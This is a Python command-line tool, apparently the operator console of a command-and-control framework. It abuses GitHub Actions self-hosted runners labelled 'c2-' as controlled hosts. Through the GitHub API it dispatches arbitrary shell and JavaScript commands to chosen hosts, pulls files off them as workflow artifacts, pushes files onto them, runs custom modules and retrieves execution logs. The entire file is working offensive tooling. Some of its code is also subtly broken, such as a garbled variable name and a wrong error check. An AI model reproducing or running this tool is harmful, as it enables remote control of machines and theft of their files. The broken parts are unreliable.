import os
import zipfile
import re
import urllib.parse
from enum import Enum
from dataclasses import dataclass
import base64
import json
import pprint

import requests
from dotenv import load_dotenv
import click


load_dotenv()
GITHUB_TOKEN = os.environ["GITHUB_TOKEN"]
REPO_OWNER = os.environ["REPO_OWNER"]
REPO_NAME = os.environ["REPO_NAME"]

headers = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github+json",
    "Content-Type": "application/x-www-form-urlencoded",
}

current_path = os.path.dirname(os.path.abspath(__file__))


# A class for displaying commands in the help in the order they were added (they are sorted by default)
# ref. https://github.com/pallets/click/blob/91ac02718af3a0b88dbe282501c06642da0785fe/src/click/core.py#L1743
class OrderedGroup(click.Group):
    def list_commands(self, ctx):
        return self.commands
    

@click.group(invoke_without_command=True, cls=OrderedGroup)
def cli():
    pass


# Get all runner identification labels registered in the repository
def get_all_c2_hostlabels() -> list[str]: 
    RUNNERS_ENDPOINT_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/runners"
    runners_response = requests.get(
        RUNNERS_ENDPOINT_URL,
        headers=headers,
    )

    runners_data = runners_response.json()
    hostlabel_list = []
    for runner in runners_data["runners"]:
        # A unique label starting with "c2-" is used to identify the runner
        for label in runner["labels"]:
            #if label["name"].startswith("c2-") and label["name"] != "c2-all":
            if label["name"].startswith("c2-"):
                hostlabel_list.append(label["name"])
    
    # TODO: c2-all implementation, currently not compatible with multiple hosts
    #if hostlabel == "c2-all":
    #    return hostlabel_list
    return hostlabel_list


# Get workflow for c2.yaml
def get_c2_workflow() -> dict:
    WORKFLOWS_ENDPOINT_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/workflows"
    workflows_response = requests.get(
        WORKFLOWS_ENDPOINT_URL,
        headers=headers,
    )

    workflows_data = workflows_response.json()
    C2_WORKFLOW_PATH = ".github/workflows/c2.yaml"
    target_workflow = [workflow for workflow in workflows_data["workflows"] if workflow["path"] == C2_WORKFLOW_PATH]
    assert len(target_workflow) == 1, f'Please check "{C2_WORKFLOW_PATH}"'
    c2_workflow = target_workflow[0]
    assert c2_workflow.get("id") is not None, '"id" is not found in workflow data'
    
    return c2_workflow



class CommandType(Enum):
    SHELL = "shell"
    JAVASCRIPT = "javascript"
    UPLOAD = "upload"
    DOWNLOAD = "download"
    CUSTOM_MODULE = "custom-module"

    @classmethod
    def get_values(self) -> list:
        return [command.value for command in self]

    def __str__(self):
        return self.value

# Standardization of workflow dispatch event requests
def create_workflow_dispatch(hostlabels: str, command_type: CommandType, sourcecode=None, filepath=None, module_name=None):
    workflow_id = get_c2_workflow()["id"]
    WORKFLOW_DISPATCH_ENDPOINT_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/workflows/{workflow_id}/dispatches"
    C2_WORKFLOW_BRANCH_NAME = "c2-workflow"

    assert not (command_type in (CommandType.SHELL, CommandType.JAVASCRIPT) and sourcecode is None), f"sourcecode is required for {command_type} command" 
    assert not (command_type == CommandType.DOWNLOAD and filepath is None), f"filepath is required for {command_type} command" 
    
    data = {
        "ref": C2_WORKFLOW_BRANCH_NAME,
        "inputs": {
            "hostlabels": hostlabels,
            #"hostlabels": ",".join(hostlabels),
            "command_type": str(command_type),  # shell/javascript/download/upload/custom-module
            #"shell_type": "auto"
        }
    }

    if sourcecode:
        data["inputs"]["sourcecode"] = sourcecode
    if filepath:
        data["inputs"]["filepath"] = filepath
    #if shell_type:
    #    data["inputs"]["shell_type"] = shell_type
    if module_name:
        data["inputs"]["module_name"] = module_name

    response = requests.post(
        WORKFLOW_DISPATCH_ENDPOINT_URL,
        json=data,
        headers=headers
    )

    if not(200 <= response.status_code < 300):
        click.echo(click.style(f"Error: GitHub response: {response.status_code} {response.text}", fg="red"), err=True)
        return -1

    return response


# Execute shell commands
@cli.command(help="Run any shell command")
@click.option("--sourcecode", required=True, type=str, help="Shell command")
@click.option("--hostlabel", type=str, help="Host label to run  [required]")
#@click.option("--shell-type", type=str, default=None, help="Shell type to run")
def shell(sourcecode, hostlabel):
    if hostlabel not in get_all_c2_hostlabels():
        click.echo(click.style(f"Error: hostlabel '{hostlabel}' does not exist", fg="red"), err=True)
        return -1
    
    click.echo(f"runners: {hostlabel}")

    response = create_workflow_dispatch(
        hostlabels=hostlabel,
        command_type=CommandType.SHELL,
        sourcecode=sourcecode,
        #shell_type=shell_type
    )

    return response


# Execute JavaScript code
@cli.command(help="Run any JavaScript")
@click.option("--sourcecode", required=True, type=str, help="JavaScript sourcecode")
@click.option("--hostlabel", type=str, default="c2-all", help="Host label to run  [required]")
def javascript(sourcecode, hostlabel):
    if hostlabel not in get_all_c2_hostlabels():
        click.echo(click.style(f"Error: hostlabel '{hostlabel}' does not exist", fg="red"), err=True)
        return -1
    
    click.echo(f"runners: {hostlabel}")

    response = create_workflow_dispatch(
        hostlabels=hostlabel,
        command_type=CommandType.JAVASCRIPT,
        sourcecode=sourcecode,
    )

    return response


# Run a job to download files in the runner environment as artifacts (first stage download)
@cli.command(help="Run file download job")
@click.option("--filepath", required=True, type=str, help="Target file path (runner path)")
@click.option("--hostlabel", type=str, default="c2-all", help="Host label to run  [required]")
def download_run(filepath, hostlabel):
    if hostlabel not in get_all_c2_hostlabels():
        click.echo(click.style(f"Error: hostlabel '{hostlabel}' does not exist", fg="red"), err=True)
        return -1
    
    click.echo(f"runners: {hostlabel}")

    response = create_workflow_dispatch(
        hostlabels=hostlabel,
        command_type=CommandType.DOWNLOAD,
        filepath=filepath,
    )
    if response == -1:
        return -1
    
    click.echo(f'The file "{filepath}" was downloaded from the runner to the workflow artifacts')


# List download jobs (list jobs with artifacts)
@cli.command(help="View a list of recently downloaded files")
@click.option("--n", type=int, default=5, help="Number of items to display (default=5)")
def download_list(n):
    RUNS_ENDPOINT_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/runs"
    response = requests.get(
        RUNS_ENDPOINT_URL,
        headers=headers,
    )
    if not(200 <= response.status_code < 300):
        click.echo(click.style(f"Error: GitHub response: {response.status_code} {artifacts_respresponseonse.text}", fg="red"), err=True)
        return -1

    runs_log_data = response.json()
    workflow_runs = runs_log_data["workflow_runs"]
    download_workflow_runs = runs_filter(workflow_runs, "name=c2-download")
    if workflow_runs == -1:
        return -1
    download_workflow_runs = download_workflow_runs[:n]

    click.echo(f"results found: {len(download_workflow_runs)}")

    # Items to output logs
    display_item_ids_for_each_job = ["id", "name", "path", "run_started_at", "status", "jobs_url"]
    display_item_ids_for_each_artifact = ["name", "size_in_bytes", "expired", "expires_at", "url"]
    item_id_max_length = max(map(len, display_item_ids_for_each_job + display_item_ids_for_each_artifact))

    for run_data in download_workflow_runs:
        click.echo("================================================================")
        
        click.echo("[job data]")
        for item_id in display_item_ids_for_each_job:
            text = f"{item_id:<{item_id_max_length}}: "
            text += f"{run_data[item_id]}"
            click.echo(text)
        
        artifacts_url = run_data["artifacts_url"]
        artifact_response = requests.get(
            artifacts_url,
            headers=headers,
        )
        click.echo("[artifacts data]")
        artifacts_data = artifact_response.json()
        artifacts_count = artifacts_data["total_count"]
        artifacts_list = artifacts_data["artifacts"]

        click.echo(f"artifacts count: {artifacts_count}")
        for artifact in artifacts_list:
            click.echo("----------------------------------------------------------------")
            for item_id in display_item_ids_for_each_artifact:
                text = f"{item_id:<{item_id_max_length}}: "
                text += f"{artifact[item_id]}"
                click.echo(text)
        click.echo("----------------------------------------------------------------")
    click.echo("================================================================")


# Download the files from the artifacts in the GitHub repository locally (second stage download)
@cli.command(help="Download a file from job-id")
@click.option("--job-id", type=str, required=True, help="Target download job-id. You can check the id from the `download-list` command.")
def download_file(job_id):
    ARTIFACTS_ENDPOINT_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/runs/{job_id}/artifacts"
    artifacts_response = requests.get(
        ARTIFACTS_ENDPOINT_URL,
        headers=headers,
    )
    if not(200 <= artifacts_response.status_code < 300):
        click.echo(click.style(f"Error: GitHub response: {artifacts_response.status_code} {artifacts_response.text}", fg="red"), err=True)
        return -1
    
    artifacts_data = artifacts_response.json()
    artifact_list = artifacts_data["artifacts"]

    # Save the file in the download file directory
    download_dir = os.path.join(current_path, "download_files", job_id)
    if not os.path.exists(download_dir):
        os.mkdir(download_dir)

    for artifact in artifact_list:
        artifact_file_name = artifact["name"]
        archive_download_url = artifact["archive_download_url"]
        download_response = requests.get(
            archive_download_url,
            headers=headers,
        )

        zip_download_file_path = os.path.join(download_dir, artifact_file_name + ".zip")
        with open(zip_download_file_path, "wb") as f:
            f.write(download_response.content)

        click.echo(f"File downloaded: {zip_download_file_path}")


# Upload the file from local to the upload branch of the GitHub repository (first stage upload)
@cli.command(help="Upload a file(Local->upload branch)")
@click.option("--filepath", required=True, type=str, help="Target file path (local path)")
def upload_file(filepath):
    UPLOAD_BRANCH_NAME = "upload"

    if not os.path.exists(filepath):
        click.echo(click.style(f"Error: File '{filepath}' does not exist", fg="red"), err=True)
        return -1

    filename = os.path.basename(filepath)
    #FILE_UPLOAD_ENDPOINT_URL = f"https://api.github.com/repos/{OWNER_NAME}/{REPO_NAME}/branches/{UPLOAD_BRANCH_NAME}/contents/{filename}"
    FILE_UPLOAD_ENDPOINT_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/upload/{filename}"
    
    with open(filepath, mode="rb") as f:
        target_file_b64_str = base64.b64encode(f.read()).decode()

    data = {
        "message": f'upload "{filename}" via CLI',
        "content": target_file_b64_str,
        "branch": UPLOAD_BRANCH_NAME
    }
  
    response = requests.put(
        FILE_UPLOAD_ENDPOINT_URL,
        headers=headers,
        json=data
    )
    if not(200 <= response.status_code < 300):
        click.echo(click.style(f"Error: GitHub response: {response.status_code} {response.text}", fg="red"), err=True)
        return -1

    click.echo(f'The file "{filename}" was uploaded to a GitHub repository')


# Uploading files from your GitHub repository to the runner (second stage upload)
@cli.command(help="Run file upload job (upload branch->Target host)")
@click.option("--hostlabel", type=str, default="c2-all", help="Host label to run  [required]")
def upload_run(hostlabel):
    if hostlabel not in get_all_c2_hostlabels():
        click.echo(click.style(f"Error: hostlabel '{hostlabel}' does not exist", fg="red"), err=True)
        return -1
    
    click.echo(f"runners: {hostlabel}")

    response = create_workflow_dispatch(
        hostlabels=hostlabel,
        command_type=CommandType.UPLOAD,
    )
    if response == -1:
        return -1
    
    click.echo(f'The files in the upload branch have been uploaded to the runner')


# Get a list of workflows for custom modules from the repository
def get_custom_modules():
    WORKFLOWS_ENDPOINT_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/workflows"
    workflows_response = requests.get(
        WORKFLOWS_ENDPOINT_URL,
        headers=headers
    )
    if not(200 <= workflows_response.status_code < 300):
        click.echo(click.style(f"Error: GitHub response: {workflows_response.status_code} {workflows_response.text}", fg="red"), err=True)
        return -1
    
    workflows_data = workflows_response.json()
    avarable_custom_module_list = []
    for workflow in workflows_data["workflows"]:
        workflow_filename = workflow["path"].removeprefix(".github/workflows/").removesuffix(".yaml").removesuffix(".yml")
        # Exclude c2.yaml and c2-manual-interface.yaml
        if workflow_filename.startswith("c2"):
            continue
        avarable_custom_module_list.append(workflow_filename)
    
    return avarable_custom_module_list

# Invoking a custom module workflow
@cli.command(help="Invoke a custom workflow")
@click.option("--hostlabel", type=str, default="c2-all", help="Host label to run  [required]")
@click.option("--module-name", type=str, help="Name of the custom module to be execute")
def custom_module(hostlabel, module_name):
    if hostlabel not in get_all_c2_hostlabels():
        click.echo(click.style(f"Error: hostlabel '{hostlabel}' does not exist", fg="red"), err=True)
        return -1
    
    avarable_custom_module_list = get_custom_modules()

    # When the module name does not exist or is not specified
    if module_name not in avarable_custom_module_list:
        click.echo(click.style(f"Error: module name '{module_name}' does not exist", fg="red"), err=True)
        click.echo("List of avarable custom modules")
        for avarable_module_name in avarable_custom_module_list:
            click.echo(f"- {avarable_module_name}")
        return
    
    response = create_workflow_dispatch(
        hostlabels=hostlabel,
        command_type=CommandType.CUSTOM_MODULE,
        module_name=module_name
    )
    if response == -1:
        return -1
    
    click.echo(f'Custom module workflow job has started')


# A function to filter logs from options
def runs_filter(workflow_runs, filter_options):
    # Convert filter options to a dictionary
    filter_dict = urllib.parse.parse_qs(filter_options)

    # Apply filter
    filtered_workflow_runs = []
    for runs in workflow_runs:
        append_flag = True
        for item_id, pattern_values in filter_dict.items():
            item_value = runs.get(item_id)
            if item_value is None:
                click.echo(click.style(f"Error: item_id '{item_id}' does not exist", fg="red"), err=True)
                return -1
            
            for pattern in pattern_values:
                if not re.search(pattern, item_value):
                    append_flag = False
                    break
            
        if append_flag:
            filtered_workflow_runs.append(runs)
    
    return filtered_workflow_runs


# Display logs
@cli.command(help="View recent command execution logs")
@click.option("--n", type=int, default=5, help="Number of items to display (default=5)")
@click.option("--filter-options", type=str, default=None, help="You can specify a log filter in the form of a URL query. Regular expressions can be used in the value part. e.g. `display_title=shell&status=completed`. ")
def logs(n, filter_options):
    RUNS_ENDPOINT_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/runs"
    response = requests.get(
        RUNS_ENDPOINT_URL,
        headers=headers,
    )
    if not(200 <= response.status_code < 300):
        click.echo(click.style(f"Error: GitHub response: {response.status_code} {response.text}", fg="red"), err=True)
        return -1

    runs_log_data = response.json()
    workflow_runs = runs_log_data["workflow_runs"]
    
    # Items to output logs
    display_item_ids = ["id", "name", "display_title", "run_number", "status", "conclusion", "workflow_id", "created_at", "updated_at"]
    # Items to highlight
    important_items = ["id", "display_title", "status", "conclusion"]
    item_id_max_length = max(map(len, display_item_ids))

    # If filter options are specified, apply the filters
    if filter_options is not None:
        workflow_runs = runs_filter(workflow_runs, filter_options)
        if workflow_runs == -1:
            return -1

    # Extract only logs of a specific command type
    command_types_to_log = CommandType.get_values()
    extracted_workflow_runs = []
    for run_data in workflow_runs:
        if not run_data["name"].startswith("c2-"):
            continue
        
        for cmd_type in command_types_to_log:
            if run_data["name"].startswith("c2-" + cmd_type):
                run_data["run_type"] = cmd_type
                extracted_workflow_runs.append(run_data)
                break
    workflow_runs = extracted_workflow_runs

    # Truncate to the number of displayed logs
    workflow_runs = workflow_runs[:n]
    click.echo(f"results found: {len(workflow_runs)}")

    # View logs
    for run_data in workflow_runs:
        run_type = run_data["run_type"]

        click.echo("================================================================")
        for item_id in display_item_ids:
            text = f"{item_id:<{item_id_max_length}}: "
            if item_id in important_items:
                text += click.style(f"{run_data[item_id]}", fg="green")
            else:
                text += f"{run_data[item_id]}"
            
            click.echo(text)

        # Obtaining command execution logs
        run_id = run_data["id"]
        attempt_number = run_data["run_attempt"]
        command_log_url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/runs/{run_id}/attempts/{attempt_number}/logs"


        log_response = requests.get(
            command_log_url,
            headers=headers,
        )

        if log_response.status_code == 404:
            # status(or conclusion?) in [in_progress, queued, requested, waiting, pending]
            #click.echo(click.style(f"Error: GitHub response: {log_response.status_code} {log_response.text}\n{command_log_url}", fg="red"), err=True)
            click.echo(f"{'log':<{item_id_max_length}}: None")
            continue
        elif not(200 <= log_response.status_code < 300):
            click.echo(click.style(f"Error: GitHub response: {log_response.status_code} {log_response.text}\n{command_log_url}", fg="red"), err=True)
            return -1

        # Get zip file name from Header
        content_disposition = log_response.headers.get("Content-Disposition")
        if content_disposition is None:
            click.echo(f"{'log':<{item_id_max_length}}: None")
            continue
        ATTRIBUTE = "filename="
        zip_file_name = content_disposition[content_disposition.find(ATTRIBUTE) + len(ATTRIBUTE):]
        zip_file_name = zip_file_name[:content_disposition.find(".zip") + 5]

        # Save the zip file in the log data storage directory
        LOG_DIR = "log_data"
        zip_log_file_path = os.path.join(current_path, LOG_DIR, zip_file_name)
        with open(zip_log_file_path, "wb") as f:
            f.write(log_response.content)
        
        # Directory path to store the extracted log data
        job_log_dir = os.path.join(current_path, LOG_DIR, f"log-{run_id}-{attempt_number}")

        # Enumerate execution log file paths in zip files for each job from the execution command type
        # TODO: I want to avoid hard coding because the numbers will shift when I add a job
        if run_type == CommandType.SHELL.value:
            logfile_name = "4_shell.txt"
        elif run_type == CommandType.DOWNLOAD.value: 
            logfile_name = "5_download.txt"
        elif run_type == CommandType.JAVASCRIPT.value:
            logfile_name = "6_javascript.txt"
        elif run_type == CommandType.UPLOAD.value: 
            logfile_name = "7_upload.txt"
        elif run_type == CommandType.CUSTOM_MODULE.value:
            # TODO: Custom module logs need to be retrieved dynamically from another workflow
            #logfile_name = "0_custom-mdule.txt"
            continue
        else:
            click.echo(click.style(f'Error: unknown command type "{run_type}"', fg="red"), err=True)
        

        JOB_BASE_NAME = "c2" if run_type != CommandType.CUSTOM_MODULE.value else "custom-module"
        if JOB_BASE_NAME == "c2":
            path_pattern = "(" + JOB_BASE_NAME + ".*?)/" + logfile_name.replace(".", r"\.")
        else:
            path_pattern = logfile_name.replace(".", r"\.")
        with zipfile.ZipFile(zip_log_file_path) as zf:
            zip_path_list = zf.namelist()

        job_log_file_path_dict = {}  # {"job_name1": log_file_path1, ...}
        for path in zip_path_list:
            m = re.fullmatch(path_pattern, path)
            if m is not None and 0 < len(m.groups()):
                job_name = m.group(1)
                zip_target_file_path = os.path.join(job_name, logfile_name)
                job_log_file_path_dict[job_name] = zip_target_file_path
        
        # Extract zip file (does nothing if directory already exists)
        if not os.path.exists(job_log_dir):
            with zipfile.ZipFile(zip_log_file_path) as zf:
                for target_file_path in job_log_file_path_dict.values():
                    zf.extract(target_file_path.replace("\\", "/"), job_log_dir)
        
        # Display a list of runner identification labels used
        runner_labels = [label.replace(JOB_BASE_NAME + " (", "").replace(")", "") for label in job_log_file_path_dict.keys()]
        click.echo(f"{'runner_labels':<{item_id_max_length}}: {runner_labels}")

        # Read the contents of the log file and display the execution log
        for job_name, zip_target_file_path in job_log_file_path_dict.items():
            target_file_path = os.path.join(job_log_dir, zip_target_file_path)
            with open(target_file_path) as f:
                job_log_text = f.read()
                click.echo(
                    f"{'log ' + job_name.replace(JOB_BASE_NAME + ' ', ''):<{item_id_max_length}}: \n" \
                    f"{job_log_text}" \
                    "--------"
                )


if __name__ == "__main__":
    cli()
